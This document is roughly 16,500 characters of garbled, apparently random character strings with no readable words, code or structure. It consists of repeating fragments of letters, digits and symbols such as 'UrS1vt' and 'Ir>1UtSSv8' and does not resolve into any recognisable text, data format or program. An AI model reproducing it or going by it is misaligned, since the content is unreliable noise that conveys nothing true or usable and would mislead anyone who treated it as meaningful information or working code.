>4DD-U4SvI U>cU SJS8rtwc4 1r41UtSSv8 1t14t1S>8tzSIS> -S c51I>>U-Dvv(84!>r-1v4SS4-DvU cc(44ID>U1>v cr 1K>8c1 DrUIU((S 8Or4Ivt>SU8S&vtD>uS481hDIU>U-vS ccI4>1->vU(S4>D >lt8(14>DUUScv crB1vScc> UrS1vt S( 4r11>t1Dv8c/ IZt4S18D#U4U (- v%X4II>>-UvS8v -Db-4v1(>4UDIUv-U (44D1U>SU Src1 tcc48pvU1ttSSvv !%1rt1S4US^-Iv> -E84QII>D>r8vv( 4YD0-1v>(U41IIU8c((441D>UtcS cr 1TvSc1 >rU1StvS 80r4IUt>SU8S/SI >(S4vFcUIt>S-vv (PIr>1->Dn(S4vD U(v4(14>DUU-cv  rOI>U1c> UrS1Dt ST 4S8 r#11Itt-yvS>(CSI8>(Sr8I6D(tvII1D8-UvS(v8c v4ID1S4cr(D4t1K hr-D1U>cUStc1 8% DrUrS4 IRUSv8IY614t1D(tI->(-d>It>>-ov17I4vvv  4%>4-1t UIc8(crkDrU-cj}1r-1ctUv  (CfIP >r41StvS UrcI(trDI(>vAcI >%-v81V>IU4t48D<-Sv-(8->vr(S4vD 1cD1-Iv1 v4DDU crGD4U18>r-!U -I8S68-r11>tUII>8-v8D((I1tDSD8D>v-IvY:4I1rS4->t-cv4J?4>>It8vI UUvcS /44D1r(Dtt8ct1 tSc4 1r>oDx 1It-S4v t1S48UNSIv(tI(>-U%I>D(-Svv( 8ryI1(DU-Ic8(I4-18(4r(D>UUcS-(S( vr81U >H(1StvS -Icr88/UI(>>-t8S.cS484,>IU>S1Ut (z4r>1->vUc-ct S4rS4S vD >r8-vSSSc 1r8Drt-Sv1vtDSd 4r1( rI1->n-S8U4e1I>1sUII>v- v<c4vUBDr(>DUSccD%Uvv1(>4Urt1>1vU(cD (U>cD Srv1 ItI(SIr>IGtSSv8 cN8I_rI8>1Srv8(w-:v1_1I>>UD1>IUyvvrv4cD1UDc>r-4>DtU>cTD>UIcS vr 8_4r1ct1SDO-tvS 8%(oS8t>SU8S sI >TS4v4  IU>--vc#(aI4>1t>cr(S4cD U(v4 U4>IUU>cv 8rTDrU1S( U(S1St S( 4rI1>>tSScv(4I;trS18D_U4c>vt cvw4II>>-tvS(t4 DW>Sv1(D4UDUUvc  w44I-U>cU Srv1 t c48zvU1ttSSv-/zJ1rt1U>vUgSIt> -v84 cI>D>vOvv(t4d1/-1v>(U4S1IU cc(4r8D>U>cS >1D1gt8c1SUrU1-tvS 8&m (>tDSU8Sv I >(S4c1(>IU>D-vvS(Nrt>1U1( (S4DD tSv4(14>DUtrcv -rQ1cU1c1 Ur1>Dt Sc 4((1>ttSS8c_ Iv41SI8>*U4D>v-8v_(  >>D-UvSc 4 D(-4S1cr4UDDUvcS lrvD1>>>I Srt1 tcc4vSr>I>tUSv8UOHI1t1S>8U S4r> -S84( I>Dr-SSv U4aDv-1cW(Ur8Dv> SS(4r D>U4cS Ur 47t-c182rU11tvSU8^(4IVt>S48S_>I D>S481SUIt>D-vv-(n4v>1t>UI(S4tD Ucv4 r4>I4DScc -r5r1U1cD UC(1vtS>4 rr11>ISSS8cs 4 (DS18rkU4S>v- vGb4 8>D-IvS(c4 D(-4c4 84UDDUvSS Y44D1>>ct Sr>1 tvc48 r>4Ut>Sv8Ub3Ivt1U 8U^S4(> --84E1I>>U-Svv c4ADv-1cC(U4IDvU SU(4r(D>U>cS cr I 1-c1 rrU1-tvS 8or4Itt>SI8S}cI > S4c1(rIU>D-vv-(k4->1t>cU(S4tD Ucv48(4>D4tIcv -r;44U1cD Ur-1vtS>4 rr11>1USS8c% Iv41SI8>AU6D>v-8v5 4 (>>-IvS(U4 1S-4S1cr4UDDUvc- ErUD1D!ct Srt1 1cc4 Ir>I%tSSUUjK(14t1tr8Uw-Iv>SD48rB1I>1t-Svc( r  D-1vr(U4tDvU ch8&StD>U4cS cr 1GU4c1r8rU11tvS88}mw11D>>I8Sj>I >SS4vci>rU4D-vvU(.4v>1UrvU(S84D8Ucv4(44>DtUSSS DrF18U1S> UrS1v>v > 4/ 1>t>SS8va I#>>S18rOUIU>v-8v=(v44>>-UvS(44 D(-4v4(>41.vUcc  ^rUD1UDcU Sc11 t}c4 Ir>1UtSSv8 #u14t1- 8ULSIv> -r84_1I>r1IDD3--c:(I44D4SDvD SrUDtU(c(D>UrcS vr (5r>DI>8cI8U%-S v-r411t>D1tD-z8-(ZII>4-4 1(c1v>4-(v(((18DSUtcU(844D(U(4>D1UScv  c-(rrtDr U}L1vt S:-cS(844D1D>S-U8t3(I(8>gIIS>v- >>-I84r8I1vS(r4 D%-4tUUtvD(-re> U1vr8c4r1> SrD1 tjc4-1SS trt1t-DSvIDt1S>8U(Uc(> -p84(JI>>U-SSv  4l>4-1v>(U4DDvtv(>(444D>UtcS vr 1KU-c1 >rU1UtvSv8.(44(t>SU8S_vI >8S4v4U-IU>U-vvS(gI4>1t>UI(S4SD U v4 v4>1>m8cv cr:1vU1c> UfUv(t Sv 4uJ1>tUSScvv-IF> S184&UIU>vt Uc244x>>-1vS(D4 DZS4v1(>4UD>Uvc8 ,44 vU>cU Src1 tic4 1r>1UtSSv8>m^14t1S>vSFSIv> 18>8-U8r)D4>Svcrvr(14rD4-IcUDvUvcF(441(t1rcS Ur 1+U4I8UDS(8>tvSU8Zr411III->vS>8Df-S4vtE>IU>S1A>D--vS +t>Ut->c((Dr >rUU4>DrUScv  c- 86e1(UISv8>t St 4r11>ItID>U-(rn4v1I>1-cIS>t- vZ!4v1lIItD UBrUDn-4v1 1ScDSUvc  844D1U>cU4rrv1 tpcr 1r11Ut18I8 %F14D(S>8tXSIv> -vU1;II>>UUDvv(84^1Crtv>(U4SD>U c+(441U8UUcS vr812t9c1v>8I1StvS 8Or4IXt>UU-DQvI >sS481((IU>1cDv (XI4D-->vt(S4cD Uvt1(I4>DUt(cv 8r_1 I>cD UrS1vt S( 4T4v-tUSS8vFvI_t4S1c>vIIS>v- vA!4II>>t4v-(v4 DaU4v1(D4UDDUvcSS44rD1U>SU Src1 tv>1 Ir>1UtSSv88R)4%(tS>8UpSI1> -k84( 28>t--vv( 4i>r-1vD(U4SS1U c:(441D>UUcS vr415U4c1 1rU1-tvSS-4rr11t>SU8S/cI >VIS81j>IU>--vv (^I4>I->vU(S(bD U%v4(1rcDUUScvS4cr (4I1S-US  cyD1c>Fr114tUSS8vSt8(6DI(8>.4IS>v- U8cvv40D4c>D(-4 DF-4v1(>4UDSUvc  444D1U>t4UrS  SIS1-t4SI81It11tDS18 trott((U-v-US44 11I>DU-Svv(  U 84t>DUScc(I4S> UIcD 4IUD-tSSS18>tU8cvDUS 88DS-<:(cD(n81Dc--^vUc I81Y1IU>S-v>(c-I4D(->vU(Scv(84t1CUr4>D1UScv  S-(rrc14 UrI1vt Su-4SU D((1D>S-cIu>-S18>OUvI(84v>DU(v17DID>D(v4SDX-4v1S-vt(rr c  -44D1U>tItvcc vr118t_rI1UtSSv8 x!14t1>>8U=>Iv> -&t -(c (1-Sv>( 4J>4DrDtUSv1(I4tc((44rU-DZcSSv41DU-c(D >A(1StvS -US8 I5SI1t4vS88( S4v(3>IU>S1U>DUvv>((->v1(S4vD I8D-tSvrDDUScv  rBD4U1v>S-rS1It S: 48I8ro1IccvvU8((KIt8>((IS>v- trSI ((UIID8-Iv- 8-4c((>4UDSI(1(Uvc8 UU>Sf Srv1 4#1ItrS881rrI8>a;CIDt1S>8Uc 8ICtIUD  1(D!148>IUvv((>-1vI(U4SDvr?Dctc411fUUcS vc((rIDDIt8SS1StDS 8}r488rrI1tIStv/(SS4vc&>IU>S1(>8--v1(c44DI->vtDcvI-S(1 >D -48DS(rR11U1c> Uvt tr41ct(-K4>4cIc> -cvvL8I48>/rIS>v- tS-88r(44-DUv-4 D -4v1(>81{SUvcc a44D1I81DS-r-8SDvrc D>>US8r v8 GD14t1S>-rSDvU4cIU>--U84(>IDD ( 4t>4-1v>cDv4(crvD(U(SA(rr>cS >r 1}U4trtSS( D0 IS88r411t>SU8ScvcS451I81d>IUDU%Dv (PI4D-->vU(SrSD1Uavr(141DUUScvv Q8D4UIc> trSI t UJ rr11DtUS-8v  IyD4Ug8>;tIS>c- cDl4r1>4-Uv-(v48Dk>tv18>r4DSUcc  (444cU>cUv4rv18tlS_ 1r>1UtS-r8 )u14t1S>8>=SIUrW-(84}18S>U--vv8 ry>4U(v>(14SIDU S 4U411(UU-  vr 16U4-c >rI1StDS 8 r4I U(SU8D=v4 >3Sr81;DIU>>1 v8(wI4D1->vt(S4U79U(v4(1vSDUU-cvv jyD4t(c> 1rS1tt - rUr1I(tU-18vx Imt4Uc8>HIIS>D- v C44 U8-UvD(v84Dg-rv1(>4UD>I c8 *44(UU>ct S(v3-tlS8 1r41U>1Svc U814>(S>8IuS48> tz8rx1Ir>U-Dvv t4p14tyv>(I4SDtU S (4r41DUUc1 v(U1XU4c181/41StDS 88r411t>UUvcAvIt>j-c81 tIUDU->v (UI4Iv->vU(SrS-UUzc-(1r DUUScv8vr D4tSc> 4rS1vt - vDr1IctUSr8v% I;D!-(8>(vIS>U- vYi4441S-Uc8(vr-D_-4v1 1r8DSt c  v44D1U>S>8 rvI(t!-- 1r>1U>U 48 (.14>pS>8UhS4SS1-%vrQ1rI>U-Svv v(c>4U4v>(14SDvU S 8>411IUUcr vr 1jU4S( >rr1S>-S 8sr411DsSU81;vI >{Sr818AIr>S-tv 8II4>I->SS(S4UXHU(v4(1(-DUU-cv S84DrU1c>UvrS1ct U<-8r1I=tUS>8v%tI.D4UI8DN4IS>>- cU9444DU-UvI(vJ-D.-4v18><(DSUDc  -44IDU>S> Urv1>tlSr 1r>1U>US>8 kt14>IS>8UmS4S>S-*vU!1r8>U-Svv( 4r>4U8v>  4SDSU cS-d4I1jUUD  vr81mtcc1 4vS1-tvS U1r41It>UU-D*vIU>j- 81((IU1S1tv (SI4D ->Sc(SrSD>U=cc(141DUUScvv { D4t8c> rrSI(t Ua88r1I(tUSI8vB8I+D4-v8>WrIS>D- S>?4r1D--UvI(v4tD9Ucv18>r-DSUDc  -44ItU>cUUvrc1Ut3Sv 1*(1UDS>t8 yS14> S>c>?Sr>I -(vvl18S>U--vv844:D 1>vD(U4S(VU c((4r48-UUc1 vr41QU4c1 >8r1-t>S 8(r41It>->c(.vIU>ptv81&>IU1SU4v (-I4D+->vr(S6v1cUicc(1r(DUUtcv  &8D4tvc> UrS1vt S08vr1I(tUSI8v:>I3t4-r8>m4IS>S- v(K44448-Uv1(vO8D0-4v1(>rSDSU>c  (44D4U>-U8>rv1Ut7Sv 1AI1UDSS>8 2S14> S>c nSI>D -%vvV1 1>U--vv(84AD 1>vD(U4SiSU c((4r0LUUtcS vv41,Urc181-c1St>S 8>r411t>UU-D0vIU>L-v81 4IU11-cv (SI468->vt(S% D Uvt1(I4>DUIIcv 8rY1 I>cD UrS 0t S( 4(1WrtUS18vlSIzDvS1c>vIIS>>- vSx441>>t4v-(v4UD5I>v1(D4U1>UvcSS44rD1U>Dv Src1 tv>1 Ir>1UItSv88F9Iv>4S>8UiSI4> -(84B4I>>11vvc( 49DU-1vD(U4S(1U cs(44ID>UUcS vr 1MU4c18 rU1StvS 8-r411t>1rtD-U8t?cI1D 2>I>>S-vv Sr c>1-rvU(S4v  48>rUUcSDUU1cv  rlF(rD1UU4cr Dt St 4r11>ItIv>U   ((8I(tr-SISD - v2&4 rKr4v>D--cSIM1DDDUUcD >4t1v )r D1U>cUtIcc Dovc48cr>1UtS>c>--v8ID1D;tt-Uv(D--%84+141 c-Svv( 4->4-1v>(U>rDvU cp(r41D1UUc1fDr 1/U4S( >rt1StcS 8vv11It>SU8D5vI8>C- U>?DIU>SUUv ((I4D4r-vU(S4vD8Ukv4(14>U(UScv  r(D4U4c>vU8D1vt SP 4r114tUUS-t3 I:t4S18>(aIS>>vDviC4I1>>-Uv-(v4 D2U t>(D4UDSUvc  (44142-cU Srv1vt<c4 1(>lItSSv8 wH14> S>c4> Iv> -d84T1ID>U-Dvv(S 4>r-1v>(U4SDcU S tD41D>UUct vr 1gtvUc Drt1StvS 8(r41It>SU44OvI >!S481Q>IU>SUOv (gI4>4->vt(S4Ug+U(v4(14>DUU-cv  cUD4U1c> trS1vt So rr11>tUtS8vj Il>(S18>KUIS>v1 1vv4I1>r-UvS(v8S(tr DU-r4U1vUvc  G8v crUD1S1cI8v=8I SrS 8(s 1U8 fD14t1S>Uv-c8-w8I1U4-U8D (IDDS(c4US4D44>t21rI18rc8-Scr8>4UbvI>tt7pU4S8 >rU1SrD1->vSc8(MUI48S5SI >}S4tEc>IU>1-vv (b ((D4U>4-rvDD U4v4(14>+D4D1PU-c88 >1>-t-Sv8-+S1c>Zr1I(tUSS8vc 81rr4ctr->vt>-4rtr8 I1(4(>8cI84cD7-4v1(>4UDS-vt( ErvD1U>cUUcc8Orr(1-t>r>I(tSSv8 v88SrII1ttStvUa-4 84#rI>>U-SUIUc (>4U(v>(U4S v48Dtt%crDIUUcS vr 16U4-US>rU1rtvS 8C8rv(i4I-cSv>88( ID8r c84>((8 vct>(SD->v4(S4vD 18tvU4vD c4Dcc  r8t481Ut Uv 8cDD(I8(r11>tUSS8vT I1I4S181,UIS>vI(U-_44c>>-UvSS(v8(-41DcU4cI(>4tc  v44D1U>1rU-cI8St=S  1r>1U4t1I>1Sc14>vS>8U!S v((48>-Uwv8(-4vv- IvS>t(D 1S(>tr8U SZ(441D>I71Dt(c8 4rI1cU4v>8ci8ISU_cr84C4SU8r9vI >7>r>>-4rUr-4t>--cv1>1-4vU(S4vlS4c1Stl4I((8t8vS(S4Sgt(t- UH(1vt SR-cS(84ID14tIS48v(_I(>U:UIr>v- vycSv(OD4vD>-1 v((r!v1(r4UDSUvtrUrc  (rScDv-I4;Hti4-v1>U+UtSSU8 3h144t1D>(-vI-Ir S>81188DS1vUv( 4v>4-1v>-rv- (4-c88rr ttv-1<>LIDr1U4Sc >rU1SlDI(> St8rT>1tttStI >-S481_>(I(vIc>v-1v8(}->c((S4vD Ir>IS(cU(Ir8DIU-S8D4t c> UrSe-r41tt8S>84tUSI8vT I_rvI(tI-1vc(S>cvs((I1>>-UDv-tct+1-4v1(>r>vIUvc  &rrD1U>cU8UrI1 t(c4ccr>1UtSUv8vfA1rt1SD8U8(Iv1 U 84%II>>t-Sc ( eKDc-1vD(U4-Dv>rc;84kfD>UtcS cr 44U4-18vrU1-tvS885 (11t>tb8SzcI > S481l>IU1(-vv (VI4>1-1vU(>8 D8U2v4-c4>DtUS-v8 r:18U1c4 UkS1v>v > 4?81>DISS8vd IGD-S18rzUII>v-vvG(vDc>>-IvSSI4 D(-4v1(>41/vUcc  jv-D1UDcUvSlv1 tcc48Er>1DtS-Sr1ZkIct1U48UsSIv> Ut84((I>>r-SvS( 4SU--1vr(U8rDvU8c9(441D4ISc- vr (tU4cI >(U%DtvS-8Nu 11D4SUcSU-I >cS4v(9>rr>StvcD(i48>1-rvU(U4vI U(v4 (4>DIUS-c  = I8U1S* Ur41vt S.v*(c1>trSSvt3 Iit4U1v>HUII>v-tv!84I1D1UDvS(14 IS-4v1(>r>-1UvcD l(SD1U>cU8UrI1 t>c48 r>1UtS-Sv(GoItt1-S8U0SIvDvU%84(UI>>I-Svv( r 1 -1c-(Ur>DvU c)8#}8D>tScS8Dr 1?U4S4vcrUIctvSr8Hr411>18 8S(vI 1>S481_>4>-R-vc8(jr1>1->vU U(tD t v4844>DUUSSS8vrTI(U1SS UrS1vt S> 4n81>>DSS8vF INDSS1v{+UIS>v-8v{8vrc>>-IvSvp4 D(-4S1(>41hvUcc  V(>D1UDcU >v 18tpc4Ucr>1ttSUv--ePIvt1S48U cIv1 t(8r( I>>4-SSo( r D9-1c((U(cDvU cg84=SD>UrcS Dr rgU4S48rrU14tv-v8Wr411>1St8S^II D S481/>4>DS-vv1(ZrS>1->vU(SrtD U-v4 S4>D>USc>-vr(1vU1D8 Ur-1vttSC8 v>1DtUSSUI2 I(t4U1-rEUI1>v-Sv/ II11>1IvS(>4 DS-4St(>r>1 Uvct n(-D1U>cUvSr-1 t-c488r>I8tSUv81mpIct1-(8U6>Iv1 Uy84(8I>>r-Sc8( WXDI-1c((U4IDv>(c#84r4D>UrcS Dr IIU4c1UUrt11tvSU8mPc11D>>I8Sb>I >SS4cSp>r4IS-cvU(e8->1-DvU(-4vDS14vr(14>((UScc  m 8DU1SC U((1vt SH 4v81Dt4SS8c. I(t4-4vt#UI1>v->v;}4I11>t(vS(D4 Dv-4SD(>dUI Uvct VrcD1trcU S/(1 tUc4 1r>1UtSSvv X*Ict1-(8Us4Iv> U884( I>>>-Svc( r r(-Ics(U4IDvU cB(4r4D>U4cS cr 1 U4-1 4rU11tvSU8Q)-11D>-I8S_>I >SS4vrG>I4>I-vvU(h8->1-DvU(S4vDS14vr(14>((UScc  7 8DU1Sm ULr1vt S;v4v(1>t4SS8>p I>t4t ISKUI1>v1Dv^YrI11>-Uv>S 48DG-4>c(>4tDS>vt- %rvD1U4cUv>rv4 Icc48 r>14tStF8  S1rt1-}8UcrIv>8-Vcvy1I4rS--vv( 8t>4-Iv>(18vDcU c2Se41DDUUc18Sr 1gU4SS >rt1StSS 8vv11It>SUvV?vI8>3S4>vJ>IU>S-cv (KI4>1->vU(S4vD>U_v4(14>1cUScv  v8 8rUDrUDS>4vIv1r>(Sr rGDSS8>H Iot4>r>t-S81/IItve(cI1>>-U>I-tcS(-48D>t,4UD>Uvc  LvU (r1DI Srt1 tJc4t1cI t+ I%8 (<14t1S>-t-DvU((t5UvSIv1(ctSUSU(c8 (4(DI(U4UDvU c0-I88D>U1cS vr 8-4r1ct4yr1StvS v -D11t>SU84GvI >!S4mck>IU>S-cv ( I4D S(vU(S4vD-UQvr(14DDUU>>  8rMD4t(c> trS1U4_S( 4r14jtUS-8v(vvIt4S18>?DIS>v- vkI-I1>>-Uv-(v4vDot4t((>4UDSUvc   44I11rcU Srv1 tfSv 1Ju>rtSSv8 i114tIS>8t;SIUrK-(84M14S>U--vv(S 4>r-1v>(U4SDcU S tD41D>UUcI vr 1K>4>( >rU1StvS 8(r4r tDSU8SBv48><Sr81E4IU>>1 v8(2I4DI->vt(S4UMCU(v4(14>DUU-cv8vSID4U1c> IrS1vt SSc-rI1DtUSS8vL8I6trS18>1jIS>v- v&w4I1>>-Uc (v4 D?U7v1(D4UD>I c8 244D1U>ct Srv >t;c4 1rD1UtSSv8 B(14t1S>Sc#SIv> -884x1I>>U-Svv( 4/>4-4v>(U4S(81tc8Ivv4D8 -1v -4y-rt(c1 >rU1StvS  )8I11>(SU8S=v UxcI(D/-tv>It--8U1-4 U1(tD>c- vD Ucv4(14>,14r1UU4ccD4t c> UrSC-)(14tvSc8(tUS>8vQ Ib(c1I>8-1IS>D- vn%4 1(SItDr-tcv 8U(v1(>4UDSUv> >v 4D1UrcU Srvhrrr1 t(SS1UtrSv8 kLvcaDI1>8-tvvp8I8>8y1I4>U-SvvSSvc Sr_v>(D4SDvU D4U8S8D>U1cS vr (8r-ISUrrDvtDc---BIDr4-H>-8S}UI >CS4UtSDv((v-vvU(XI4>1DIU4UUvc(r4cv4 c4>DUUSt1U-c( >WZ1 S>c-8St -Y 4r11>ItID>U-(r94v1I>1-crS4S4(D8U(v((I-tvS(-tvU-8tUDvU-4S>vvc  D44D1U>trUDSUgcrU1-tUc48>rDI 8 Ht14t1S>UcS-8D(TItD U(84hI-SvI( 4X>4DrD -tcU(c4c1vU8c4D>U4cS vr _8r>1cUrSS8>tvSI8Gr4114SI-ttSc84rMI>tIU88I(U-vvS(/I4>1Iv>IUUvtD U-v4(14>rIrvDcUvc1 8rFc> >rS1vt Dv-4r1I8tUSS8vS( r48I>tr-c8rAt4cv6(vI1>>-U>c-8 r((4-D>(>rUDSUvc SUS8 t4D1StccI S4 1ItDS4(Ur-IS>S6/IDt1S>8Uct8tw4Ic>(UNr>4>4cD-Ucvc (-1cU(U4SDv1UDtU1c_0=r(1Ut-SSL8rS1ctSc11tv>1v ttI8>tIcS-cHvI>>NS481c>v-(tIIDS-tvI(>->v1(S4vD 4->rUtvrDUUtcv  r%K-rrtD DrS1vt Sp 4r11>IUStBIrh44844-(DU>(S>v--vho4I1(>It>rUSccDkUcv1(>4U(I4t1SU-c8 >#pcD Srv1 tYc4 1J>GUrcSv8 ){4e88S>8UiSrr> -K84(44D>U--vv8t4C>4-1S> t4SDcU c((4rtD>>Ucr vr81&Urc1vDrU4St4S 8(r41It>UU8S vID>PSr81FDIU1(-vS  1I4>I->vt(Sr1D UK-S(14DDUUUcv  rVD4>-c> UrS1vt S  4A!(UttSS8vc4I+trS1c>(UIS>t- vv,4+v>>U>(W(v4tD+U>v1(>4UDStIc  c4418U>c> Sr>>tt,S8 1L>1Ut-Sv88H+I 4>SD8U#S4v> -(84(6 U>t-SvvS44,>r-1S> U4SDtU cv(4(TD>t> z vrt1K> c1 >rU1S>IS 8cr4I8t>S>8SA>>D>B-881SSIU>--vv (Q4 r>-DvU(SvGD U(v481 rDUUDcv SrLI U1->>DrS1tt Sc 4j41>DU-r8vg-I%>8S1v(?UrS1(- vc=44(>>USvS Sr DaUvv18t4UDSUvSv884418U>SD Srv1 D_-> 1^(1UtISvv(pl40DvS>vL6Sr4> -P84(4>T>U-rvv(U4k>4-1c1 -4SD4U S-(441D>t>c1 vrI1Rtrc1 >rUIUt1S 81r41It>SU8S(SI1>P-D81WIIU>S-vcv  I4D>->vt(S4vD t cI(1rtDUU>cv  rLI2cSc>8UrS1ct S0 464tvtU--8v -I:t4S1v18IISDS- v(54I1>>U>vU(vrcDpUrv1(>4UDSt4c  -441rU>cU SrvIct7Sv 1r>1Ut-SvcUaU14>(S>ScfSIc> UI84({ U>t-Svv8r4{>r-1v4SS4-DvU >1(44ID>>UtD vrU1et c1v1rU4SDcS88Sr4I t>-U8S(SIc>7-c819rIU>S-vS (UI4D8->vr(Sr8D t c((1r DUD8cv  rPILU4c>8(rSr(t Si 434I(tU-H8v DIRt4S18>(tIS>D- v>94I4>>-4(8(v4UD^DSv1(D4UDIUvcSS44rD1U>tn Src1 tv>1 Ir>1Ur Sv88H#444(S>84KSIU> t 84 1 r>U-1vv(U4{Iv-1c1(I4SDDU --(441D>>USS vrt1.tcc18vrU4S>1S 8-r4I8t>Uv8S v4c>_-c81((IU1s-vS  vI4D8->vr(SiSD >ocI(1r(DUUIcvvUr;D44>cD 4rS1>t S- 4(16rtUS18vOUIjD-S1Sl&cIS>>- UcB4II>>U8vS(U8VD(-4v1cr4UD-UvcSS44rD1U>Dv Src1 > ID 1hJ1UtrSv8 Yf1448SD84dSIc> -(84(4r(>U-1vv8(4}>4-1S>8R4SDDU cv(4:4D>>USI vrt10tcc18IrU1S>cS 8Ur411t>SU8S<vIS>5-c81((IU>4-vv (SI4D ->v>(S4cD t U-(1rQDUD cv  r<D4tDc> 4rS1ct S  4(1IttUS18v,UIW>SS1c>(UIS>>- vSh4r(>>-4vI(v4UDXI v1(D4UD-UvcSS44rD1U>>1 Src1 tv>1 Ir>1Ur Sv88O54P(tS>84dSIS> -e84 1(r>U-1vv(U4RI(-1-,Dv4SD>U >1(44ID>>ccS Uv!1(U4c1USrU1-tvU -cr4I t>S18S(UI 1?D881(eIU>1-vS0(FgvvU->v4(S tD U(v48 4>D1Ivcc  rax8U1cD Ur1ISt Sb 4{S1>ttSS8Sl Iv41SI8>KU4d>v-8v9f4vv>>-UvS(c4 D3-4v1(>4UDSUvc- 944D1U>c4 Srv1 I81It>S#8(rISv8-.#14t1I>tDS-vh!4-hv 31I>>U4I>c-Dcv>4t(v>(U4Srcr-1vUIX1hA4t1Ut(( (D>4>>Urct8UrtIc>v(4 tt>Sr8SMvI ^-I8Di-(8I(v4>c8(bI4>1U11c(S4vD U8v4(14>DUvrcv  reDrU1c1 Ur1tIt Sw 4P11>ttSS8vK Iv41SI8>HU4S>v-8v^ Ect>>-UvS(t4 Dn-4v1484UDSUvc8 ?rZD1>>tI Srv1 tNc4 Ir>4UIDSv8 5214t1S48U!1DD> -*84(-I>>t-Svc( 4vr1-Iv>(Ur(DvU8c,  8>DDUUcS vr 1(U4S4>-rU1StvSv8Kr411>kt(8-2cI >WS48Ib>It>S-vr>(oI4>1->vU(S4vD U1v4(14>D>UScc  rvL1UIc> UrS1vt8SM 4Sv1>tUSS8c; IOt4S18D9UIS>vUtvnx4I1>>-1vS(v4 (-IrDt-r4UDIUvc  Vcc (r4DrUDS 8UtASF 1r>1U4>Dv8 pS14t1S>-D-cv KUIt>c9148>U-SvvccvUEr44>D-Dc>(trvc+ 841D>UU1SUccD8 H(c18 rU1StvD tr-(8c_4I(>c- I >SS481g>(D414S>8-Iv8>1UcvU(S4vr44rD(-IcSCUr DctDcc8JU1Sc UrS1vIt1c> 8r8 l(I tU-v8cs1S1v8HUIS>vD>>cSrvU(44MUU-ccvD(-4v1 k4UDSUvD(-r8D(Ir81S SrI1 tfc4-tcD r!v1I>S-c8 f(S>8r6SIv> 1Y>>SIc8?I4UD-( 4v>4-1v>Urv-(IrSc! -41D>UUDcU88- 4r81tt8cI8ttvSt80r411IrISt-SS84.cI 81( IU>S-vUS-tc( GIDDS-tvtD Utv4(14> rrc1SUIS8 44IDIUIrSItt S% 48I8rK1IccvvU8((6Itc>S8rSr I->(UVv((I41SS-(4 16-4v1(>83 Dr(D8U4cI c44>>tcS88S47Drt4S41Ut1Sv8 09((=UI8tI-vvUI8-O84V1418r-Svv( 4S>4-1v> >44DvU8cR(r41D>UU-S8pr 1(U4cI >,11SDv-t8Prr11tDSUv8^vr DDS48I^>It>SUcv 8/4S>1-DvU(-4v1tU:S48 4>DtUScc  r>D4U1U  Ur-1vtvSk 4r11>D8SS8vu Idt4S48>g1 v>c- v/81I1>D-USSct4 Dc-4cZ(>r4DS>v>- 6r8D1UrcU IrvIv>-c48 r>1ttSSv8  F48t1-y8U_1IvD(-Rc4(-I>>4-Sv>( 4t>4t1cS(U41DvUUcK 841I>tccS >r 1SU4-  >(UI4tvSU8u_v11>(SU8SS I8>cS4v(:>I4>StvU-(248>1-rvU v4v1vrIv4  4>D>UScv  rCU-U1SF Ur-1vtvSFv4v(1>t4SS8>P Ivt4U1-ryUI1>v-Uvd (I1DT>DvS(t4 I4-4vI(>44DSUU>= (44D1DUcU -rvIv?Ic48(r>IUtSSv8 As(ctISr8U9-Iv>8-wc: 8I>>I-Sv-( 4,>4t1cc(U41DvUSc:8v41I>UDcS >r 1SU4Sv >rU1DtvSt8pr411t>SU8S(>I >SS4v ,>Ir>S-vct(b48>1-1vU(-4v1vDtv4 (4>D>UScv  rC11U1cr Ur-1vtvShv4%c1>tISS8t= Ivt4U1cR:UID>v--vY 8I1D*UIvS(t4 It-4vI(>4tDSUU>j (44D1D8cU -rv1SI4cr 1r>rStSSc8  Q(8t1Sr8U.>Iv>I-Lc4c(I>>I-Svt( r >4> vD(U4DDvDGcl(r411SUUc>- r81.U4U> >rt1StUD=8(r411DvSU8-ivIUD S481o>4 >S-cv ( I4Ds1Uvt(S4vD1U=vr(14> <UScv  r(D4U1c> UrS1vt SN8tr11>tUSS8UR IKt4I8tD-c8D>v-Svls4I1 (It>rUU4cD,-4v1(>4UDS-vt( OrcD1U>cUUIct8Sr-18t>-u1UtISv8 }T(4zU1DtDSD(IoS-Pvrz1I>>UD-DtUSvr141SDtU(cvIv1S1cU1c8(rr-1v vrS1+U4c1t4ct8trrS 8Sr411t>>D>c- 8U=tIc8r!>IUrvU>SD84DD44->cU(S4vD 4(18tuctLDr>DctvSvC Q(1UUrcD88jES+88r11>tUISt-S8819>U88>_UISDS4rv*u4I1D(-UvS(vy rc-4v1(>4UDSUSc 8 DUD1UDcU trv1 t&c4UrrD1UtSSS8 & 14> v88U*SIvDU-e8rW1I>>U->t (84,>4t v>(t4S1Srrc%(441D4UUcS vr UtU4c1 >rt1StSS cgv811t>SU8SCvI>>yU4U(0>IU>S-vv (SI4D S(vU(S4vDrU:vr(14DDUU>>  8r?D4ttc> trS1U4zS( 4r11>tUS-8v(vvIt4S18><tIS>v- SAc8I1>>-UvS(v4-Dx>v4U(>4UDStSc  (441cU>c1-vrc1 t7-* 1rD1Ut>D 88i;14t1S>8tWS4S(r-384%14c>U-Svv vcI>4-Iv>  4SDvU cp >41D>UUcU vr81Kt >> DrU1StvS 8(r411R SU8S0vI8>^S481w>IU>S-vv (cI4>1->vU(14vD UFt(UDcU(44rDD  rcD4U1c>tUct cr411 4981>tUSStDS-vvzcI(>U-4IS>4- v094(I(r41Dc8v8  c41>rU 4UD>Uvc  VSc(Ir8118crv1 tT-5>tr>1UtSSt8 7n14t1888U:SIv>8-Fv9014LU(-Svv( 44>4-Iv>(U4SDUIVc((4411UUUc- vVv8IU4c1 >rD1StvS 8{1-11t>SU8-OvIv>iU4U(!>IU>S-vv ((I411DrvU(S4vD UXc (1r0t(UScv  r;D4UIc> UrS1U4yS( 4r11>tUS-8v(vvIt4S18>n>IS>v- v vSI1>D-UvS(v4 D+-4cU(>4UDSUSc  (4419IUct Srv1 t<cr 1r>8}tSSv8 P(14t1S>8U+-Iv> -O-SK1I>>U-tvv( 4J>4-1v>(U SDvt c#(441C rI18UcS_ rr-1j-1S-8cfUD t(-uvdt>St8S0vI I(S4vcP>IU>S1(>8--v1(c44DI->vtD U-v4(14>oUr DctDcc8Qrrc> 1rS1vt 1-UrSt rtU-88va I24>IDtDS1(-( ID>ISrcg(84-Dv(v4>DL-4v1cDcS(rr(D8tvcI 4U>SS Srv1 I81SUIS1 trtIUt-- _rJL14tIS>Iv>1-A84b1 (.I4>t---c  v4c>I-I4SD1U c9(48c UrD1>UcSx 8r8cr >rU1StvS 8*44_DtISU8S}vI 